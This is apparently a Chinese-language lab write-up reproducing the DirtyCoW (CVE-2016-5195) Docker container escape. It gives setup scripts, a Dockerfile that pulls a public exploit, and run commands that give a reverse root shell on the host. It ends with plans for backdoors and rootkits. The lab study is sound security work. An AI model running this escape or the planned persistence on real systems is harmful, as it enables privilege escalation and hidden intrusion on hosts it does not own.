---
title: CVE-2016-5195 实验 | DirtyCoW与Docker逃逸
category: Sec
---

## CVE-2016-5195 实验 | DirtyCoW与Docker逃逸

### 0x00 前述

最近出比赛题用到Docker，于是就想到了脏牛火的那段时间有一个利用它做Docker逃逸的PoC。再一看，发现和`vdso`有关，恰好最近研究溢出也遇到了这个东西（在我的[另一篇博文](http://aptx4869.me/ctf/2017/09/08/Overflow.html)中）。

原作者演示的是`容器中的root用户`提权到`VM中的root用户`；我们这里则在镜像中加入一个普通用户`ubuntu`，演示从`容器中的普通用户`提权到`VM中的root用户`。

### 0x01 环境搭建

**VM**

手头有一个`ubuntu-14.04.4-desktop-amd64.iso`就直接拿来开新的VM了（我用`PoC`验证过是存在脏牛漏洞的）。之前也一直想过这个问题：研究漏洞需要老的内核，官网上好像不好直接下老的。如果恰好没有旧的VM或者镜像，可以考虑装一个新的VM然后做一下内核降级（我没有做），可以参考[这里](http://blog.csdn.net/dl_chenbo/article/details/52400044)。

另外就是更新源的问题。我把`sources.list`换成了上交的源，否则可能会很慢。

**Docker**

Docker的安装可以参考[官方文档](https://docs.docker.com/engine/installation/linux/ubuntu/#/prerequisites)。不过也可以直接把官方文档里的步骤写成下面这个脚本（不保证未来能用）：

```bash
sudo apt-get update

sudo apt-get install -y \
        linux-image-extra-$(uname -r) \
        linux-image-extra-virtual

sudo apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

sudo add-apt-repository \
        "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
        $(lsb_release -cs) \
        stable"

sudo apt-get update
sudo apt-get install -y docker-ce
```

之后似乎非root用户不能用`docker ps`，解决一下：

```bash
sudo groupadd docker
sudo gpasswd -a ${USER} docker
sudo service docker restart
```

退出当前用户重新登陆一下就好。

**Ubuntu Image**

国外仓库下载比较慢，我就直接从国内Docker镜像仓库下载了。感谢国内仓库。

```
docker pull registry.docker-cn.com/library/ubuntu:14.04
```

**docker-compose**

之后需要下载`docker-compose`。我发现官网给出的使用`curl`下载的命令并不好用，下载不稳定时常速度为0。我是在外边用迅雷下完然后拷进去的。下载地址是：

```
https://github.com/docker/compose/releases/download/1.17.1/docker-compose-Linux-x86_64
```

```bash
sudo cp ~/dirtycow/docker-compose-Linux-x86_64 /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
```

**Exp**

再把逃逸程序从Github上`clone`下来（其实可以跳过这步，因为后面的`Dockerfile`里有这一步）：

```bash
git clone https://github.com/gebl/dirtycow-docker-vdso.git
```

最后看一下目前的环境：

```
uname -a
    Linux br-virtual-machine 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan22 
    15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

docker -v
    Docker version 17.09.0-ce, build afdb6d4

docker-compose -v
    docker-compose version 1.17.1, build 6d101fb
```

一切就绪。建议到这里对VM做一个快照。

### 0x02 实验

**创建镜像/运行容器**

由于我们使用了国内的Docker仓库，所以也许需要在`Dockerfile`下稍微改动一下。这里同样涉及到更新源的问题。同样地，我在`Dockerfile`把源先给更换成了上海交通大学的源。

所以最终我们实验的`Dockerfile`如下：

```dockerfile
FROM registry.docker-cn.com/library/ubuntu:14.04

RUN mv /etc/apt/sources.list /etc/apt/sources.list.bak

ADD ./sources.list /etc/apt/
RUN apt-get update
RUN apt-get install -y build-essential
RUN apt-get install -y nasm
RUN apt-get install -y git

RUN useradd --create-home ubuntu
WORKDIR /home/ubuntu/
RUN git clone https://github.com/scumjr/dirtycow-vdso.git
RUN chown -R ubuntu:ubuntu /home/ubuntu/dirtycow-vdso

EXPOSE 1234

CMD /bin/bash
```

执行下面的命令来创建并运行容器：

```bash
docker-compose run dirtycow /bin/bash
```

**注意：除了之前的环境搭建外，到目前为止，以上操作均在普通用户权限下进行（我这里的普通用户叫做`br`），也没有任何的`sudo`！**

建议到这里也可以对VM做一个快照。这个Docker逃逸只能做一次，成功后退出`root shell`再次执行攻击时会失败，具体原因我还没有深入了解。

进入以后执行：

```bash
su ubuntu
cd /home/ubuntu/dirtycow-vdso
make
./0xdeadbeef 172.18.0.2:10000
```

由于最后获得的事实上是一个反弹shell，所以要给出反弹的IP和端口。端口可以随意设置，IP可以用`ifconfig`查看。我对Docker的网络机制不了解，以后记得去研究一下。

看一下截图：

![]({{ site.url }}/images/dirtycow/dirtycow-docker-0.png)

我们在VM中以`root`权限创建`/root/flag`并写入

```bash
flag{Welcome_2_the_real_world}
```

![]({{ site.url }}/images/dirtycow/dirtycow-docker-1.png)

下面看一下Docker逃逸成功的效果：

![]({{ site.url }}/images/dirtycow/dirtycow-docker-2.png)

下一步可以考虑把逃逸实验和`Pwn`的实验套在一起进行测试。即，模拟外界攻击者，先通过缓冲区溢出获得容器的普通用户`shell`。然而经过`Docker环境检测`，攻击者发现自己处在一个容器中。于是，攻击者再通过Docker逃逸获取模拟真实服务器的`root shell`。

再下一步，可以做一些`post penetration`工作。在模拟真实服务器上安装后门，维持访问。这一阶段的实验可以分为两个子实验：一是安装简单的后门，如“一句话后门等”；二是安装`rootkit`，这一子实验中又可以对`用户层rootkit`安装和`内核层rootkit`安装分别进行测试。

今天先到这里，日后把后几个实验补上。

### 0x03 原理

时间所限，暂时略去不表。未来补上。

### 0x04 参考

- [脏牛漏洞-Docker逃逸POC(dirtycow-vdso)代码分析](http://blog.csdn.net/enjoy5512/article/details/53196047)
- [【技术分享】利用Dirty Cow实现docker逃逸（附演示视频）](http://bobao.360.cn/learning/detail/3168.html)
- [github: scumjr/dirtycow-vdso](https://github.com/scumjr/dirtycow-vdso)
- [github: gebl/dirtycow-docker-vdso](https://github.com/gebl/dirtycow-docker-vdso)